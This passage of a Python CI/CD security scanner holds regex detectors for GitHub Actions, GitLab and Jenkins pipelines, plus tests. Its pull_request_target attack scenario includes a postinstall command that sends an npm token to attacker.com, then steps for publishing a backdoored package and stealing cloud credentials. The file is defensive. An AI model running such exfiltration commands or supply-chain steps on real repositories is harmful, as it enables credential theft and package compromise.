                                "Build steps (npm install, npm test, pip install, make) execute code from PR: package.json postinstall scripts run malicious code",
                                "GitHub doesn't require approval for pull_request_target workflows from forks (unless environment protection configured)",
                                "Workflow runs automatically on PR creation - no manual review before execution",
                                "Fork PRs are common attack vector - anyone can fork public repo and create malicious PR",
                                "Many developers misunderstand pull_request vs pull_request_target - use wrong trigger",
                                "Documentation examples sometimes show pull_request_target without security warnings",
                                "Legitimate use case (commenting on PRs) makes developers think trigger is safe",
                                "Attacker can test exploitation locally before creating PR (fork workflow runs show whether exploit works)",
                                "GitHub Actions logs may hide exploitation - attacker can suppress output with 2>/dev/null",
                                "Workflow can't distinguish between trusted maintainer PRs and untrusted fork PRs without explicit checks"
                            ],
                            "why_not_vulnerable": [
                                "Using 'pull_request' trigger instead of pull_request_target (runs in fork context, read-only permissions)",
                                "pull_request_target workflow does NOT check out PR code - only uses 'actions/checkout@v3' without ref parameter (checks out target repo code)",
                                "Workflow restricted to same-repo PRs: 'if: github.event.pull_request.head.repo.full_name == github.repository'",
                                "Environment protection configured: 'environment: production' requires manual approval",
                                "Workflow doesn't run any PR code: only performs static analysis, doesn't execute build scripts",
                                "Using workflow_run trigger for privileged operations (runs after pull_request workflow completes, doesn't execute PR code)",
                                "Permissions explicitly restricted: 'permissions: contents: read, pull-requests: write' (minimal permissions)",
                                "PR code executed in isolated container without network access or secrets"
                            ],
                            "patterns_checked": [
                                r"on:\s*pull_request_target",
                                r"ref:\s*github\.event\.pull_request\.head\.sha",
                                r"ref:\s*github\.head_ref",
                                r"checkout.*pull_request\.head"
                            ],
                            "evidence": {
                                "trigger": "Workflow uses 'pull_request_target' trigger (privileged context)",
                                "pr_checkout": "Workflow checks out PR code using attacker-controlled ref",
                                "no_restrictions": "No check for same-repo PRs (allows fork PRs)",
                                "secret_access": "Workflow has access to repository secrets"
                            },
                            "attack_scenario": {
                                "step_1": f"Workflow at line {locations[0]['line_number']} configured with 'on: pull_request_target' and checks out PR code",
                                "step_2": "Attacker forks public repository: https://github.com/attacker/forked-repo",
                                "step_3": "Adds malicious postinstall script to package.json: 'postinstall': 'curl http://attacker.com/exfil?token=$NPM_TOKEN'",
                                "step_4": "Creates pull request from fork: 'Fix typo in README'",
                                "step_5": "Target repo workflow runs automatically with pull_request_target trigger",
                                "step_6": "Workflow checks out attacker's PR code: 'uses: actions/checkout@v3 with: ref: github.event.pull_request.head.sha'",
                                "step_7": "Workflow runs 'npm install' which executes postinstall script from attacker's package.json",
                                "step_8": "Postinstall script exfiltrates NPM_TOKEN secret: 'curl http://attacker.com/exfil?token=${{ secrets.NPM_TOKEN }}'",
                                "step_9": "Attacker receives npm token: 'npm_xyz123...abc' with publish permissions for company packages",
                                "step_10": "Tests token: 'npm whoami --registry https://registry.npmjs.org' - confirms access to '@company' scope",
                                "step_11": "Publishes malicious version of popular package: 'npm publish @company/auth@2.0.1' with backdoor",
                                "step_12": "Backdoored package installed by 10k+ downstream projects during next 'npm install'",
                                "step_13": "Backdoor steals environment variables from all installations: AWS keys, database credentials, API tokens",
                                "step_14": "Uses stolen AWS credentials to access production databases: 'aws rds describe-db-instances'",
                                "step_15": "Exfiltrates customer database: 8M records with PII, credit cards → sells for $3M on dark web",
                                "alternative_attack_1": "Use GITHUB_TOKEN to push malicious commit directly to main branch",
                                "alternative_attack_2": "Modify workflow file to create persistent backdoor for future PRs",
                                "alternative_attack_3": "Steal AWS credentials from secrets, deploy cryptominers generating $60k AWS bill",
                                "impact": "Repository Takeover (GITHUB_TOKEN write access), Credential Theft (all secrets accessible), Supply Chain Attack (publish malicious packages), Data Breach (8M customer records), Financial Loss ($3M from data sale, $60k AWS bills), Production Compromise (backdoored dependencies deployed)"
                            }
                        }
                    })
                    self.score = 0

        # Pattern 12: Dynamic command execution
        if re.search(r'run:.*\$\{\{.*\}\}.*(?:eval|exec|bash -c)', code):
            locations = find_pattern_locations(code, r'run:.*\$\{\{.*\}\}')
            if locations:
                self.vulnerabilities.append({
                    "type": "DYNAMIC_COMMAND_EXECUTION",
                    "severity": "CRITICAL",
                    "description": "Dynamic command construction with user input - shell injection risk",
                    "recommendation": "Use action inputs or environment variables instead of inline expression evaluation",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Apply severity-weighted penalties (opt-in for backward compatibility)
        if self.use_severity_penalties:
            from utils.scoring import calculate_score_with_severity_penalties
            final_score = calculate_score_with_severity_penalties(
                self.vulnerabilities,
                self.score,
                2
            )
        else:
            final_score = self.score
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": final_score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_gitlab_ci(self, code: str) -> Dict:
        """Analyze GitLab CI/CD pipeline for security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Hardcoded credentials (AWS keys, API keys, tokens)
        secret_pattern = r'(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|API_KEY|SECRET_KEY|TOKEN|PASSWORD):\s*["\']?(?:AKIA|sk-|AIza|ghp_|[A-Za-z0-9+/]{20,})'
        if re.search(secret_pattern, code, re.IGNORECASE):
            locations = find_pattern_locations(code, secret_pattern, re.IGNORECASE)
            if locations:
                self.vulnerabilities.append({
                    "type": "HARDCODED_CREDENTIALS",
                    "severity": "CRITICAL",
                    "description": "Hardcoded credentials in GitLab CI pipeline - exposed in repository",
                    "recommendation": "Use GitLab CI/CD variables with protected/masked flags",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 2: Missing dependency verification (pip install without hash verification)
        if re.search(r'pip\s+install(?!\s+.*--require-hashes)', code):
            locations = find_pattern_locations(code, r'pip\s+install')
            if locations:
                self.vulnerabilities.append({
                    "type": "MISSING_DEPENDENCY_VERIFICATION",
                    "severity": "HIGH",
                    "description": "Installing dependencies without hash verification - supply chain risk",
                    "recommendation": "Use pip install with --require-hashes or pip-audit",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 3: Script injection from merge request variables
        injection_pattern = r'\$(?:CI_MERGE_REQUEST_TITLE|CI_MERGE_REQUEST_DESCRIPTION|CI_COMMIT_MESSAGE)'
        if re.search(injection_pattern, code):
            locations = find_pattern_locations(code, injection_pattern)
            if locations:
                self.vulnerabilities.append({
                    "type": "SCRIPT_INJECTION",
                    "severity": "CRITICAL",
                    "description": "Untrusted input used directly in pipeline - code injection risk",
                    "recommendation": "Sanitize CI variables before use or avoid using untrusted input in scripts",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 4: Artifacts without verification
        if re.search(r'artifacts:', code):
            has_checksum = re.search(r'(?:sha256|checksum|verify)', code, re.IGNORECASE)
            if not has_checksum:
                locations = find_pattern_locations(code, r'artifacts:')
                if locations:
                    self.vulnerabilities.append({
                        "type": "MISSING_ARTIFACT_VERIFICATION",
                        "severity": "MEDIUM",
                        "description": "Artifacts created without integrity verification",
                        "recommendation": "Generate and verify checksums for artifacts",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 5: Shared runners with sensitive operations
        if re.search(r'tags:\s*\n\s+-\s*shared', code):
            if re.search(r'(?:deploy|production|aws|secrets)', code, re.IGNORECASE):
                locations = find_pattern_locations(code, r'tags:\s*\n\s+-\s*shared')
                if locations:
                    self.vulnerabilities.append({
                        "type": "SHARED_RUNNER_RISKS",
                        "severity": "HIGH",
                        "description": "Sensitive operations running on shared runners - isolation risk",
                        "recommendation": "Use dedicated runners for production deployments",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Apply severity-weighted penalties (opt-in for backward compatibility)
        if self.use_severity_penalties:
            from utils.scoring import calculate_score_with_severity_penalties
            final_score = calculate_score_with_severity_penalties(
                self.vulnerabilities,
                self.score,
                2
            )
        else:
            final_score = self.score
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": final_score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_jenkins(self, code: str) -> Dict:
        """Analyze Jenkins pipeline (Groovy) for security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Hardcoded credentials in pipeline
        secret_pattern = r'(?:username|password|token|secret|key)\s*=\s*["\'](?!\\$|ENV)[^"\']{8,}'
        if re.search(secret_pattern, code, re.IGNORECASE):
            locations = find_pattern_locations(code, secret_pattern, re.IGNORECASE)
            if locations:
                self.vulnerabilities.append({
                    "type": "HARDCODED_CREDENTIALS",
                    "severity": "CRITICAL",
                    "description": "Hardcoded credentials in Jenkinsfile - exposed in source code",
                    "recommendation": "Use Jenkins credentials binding: withCredentials([string(credentialsId: 'my-secret', variable: 'SECRET')])",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 2: Script injection via parameters
        if re.search(r'params\.\w+|env\.\w+', code):
            # Check if parameter is used in shell execution
            if re.search(r'sh\s+["\'].*\$\{?params\.|sh\s+["\'].*\$\{?env\.', code):
                locations = find_pattern_locations(code, r'sh\s+["\'].*\$\{?(?:params|env)\.')
                if locations:
                    self.vulnerabilities.append({
                        "type": "SCRIPT_INJECTION",
                        "severity": "CRITICAL",
                        "description": "User parameters used directly in shell commands - command injection risk",
                        "recommendation": "Sanitize parameters or use parameterized builds safely",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Pattern 3: Missing input validation
        if re.search(r'parameters\s*\{', code):
            has_validation = re.search(r'validate|sanitize|escape', code, re.IGNORECASE)
            if not has_validation:
                locations = find_pattern_locations(code, r'parameters\s*\{')
                if locations:
                    self.vulnerabilities.append({
                        "type": "MISSING_INPUT_VALIDATION",
                        "severity": "HIGH",
                        "description": "Pipeline accepts parameters without validation",
                        "recommendation": "Add input validation for all parameters",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 4: Running on master node
        if re.search(r'agent\s+any|node\s*\(\s*["\']master', code):
            locations = find_pattern_locations(code, r'agent\s+any|node\s*\(\s*["\']master')
            if locations:
                self.vulnerabilities.append({
                    "type": "RUNNING_ON_MASTER",
                    "severity": "HIGH",
                    "description": "Pipeline runs on Jenkins master - resource exhaustion and security risk",
                    "recommendation": "Use agent { label 'worker' } to run on dedicated nodes",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 5: Insecure artifact retrieval (downloading from URLs in parameters)
        if re.search(r'wget|curl.*\$\{?params\.|sh.*http.*\$\{?params\.', code):
            locations = find_pattern_locations(code, r'(?:wget|curl).*\$\{?params\.')
            if locations:
                self.vulnerabilities.append({
                    "type": "INSECURE_ARTIFACT_RETRIEVAL",
                    "severity": "CRITICAL",
                    "description": "Downloading artifacts from user-provided URLs - SSRF and supply chain risk",
                    "recommendation": "Use Artifactory/Nexus with verified checksums instead of arbitrary URLs",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 6: Arbitrary code execution via user input
        if re.search(r'(?:evaluate|load)\s*\(\s*(?:params|env)\.', code):
            locations = find_pattern_locations(code, r'(?:evaluate|load)\s*\(\s*(?:params|env)\.')
            if locations:
                self.vulnerabilities.append({
                    "type": "ARBITRARY_CODE_EXECUTION",
                    "severity": "CRITICAL",
                    "description": "Executing user-provided code with evaluate() or load() - arbitrary code execution",
                    "recommendation": "Never execute user-provided code; use predefined scripts only",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Apply severity-weighted penalties (opt-in for backward compatibility)
        if self.use_severity_penalties:
            from utils.scoring import calculate_score_with_severity_penalties
            final_score = calculate_score_with_severity_penalties(
                self.vulnerabilities,
                self.score,
                2
            )
        else:
            final_score = self.score
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": final_score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }


def test_github_actions_hardcoded_secrets():
    """Test detection of hardcoded credentials."""
    vulnerable_code = '''
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Deploy to AWS
        env:
          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
        run: aws s3 sync . s3://bucket
'''
    detector = CICDSecurityDetector()
    result = detector.analyze(vulnerable_code, "yaml")
    assert result["score"] == 0, "Should detect hardcoded credentials"
    assert any('HARDCODED' in v['type'] for v in result['vulnerabilities'])


def test_github_actions_unpinned_actions():
    """Test detection of unpinned third-party actions."""
    vulnerable_code = '''
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - uses: actions/setup-node@latest
      - run: npm test
'''
    detector = CICDSecurityDetector()
    result = detector.analyze(vulnerable_code, "yaml")
    assert result["score"] < 2, "Should detect unpinned actions"
    assert any('UNRESTRICTED' in v['type'] or 'ACTIONS' in v['type'] for v in result['vulnerabilities'])


if __name__ == "__main__":
    test_github_actions_hardcoded_secrets()
    test_github_actions_unpinned_actions()
    print("All CI/CD Security detection tests passed!")
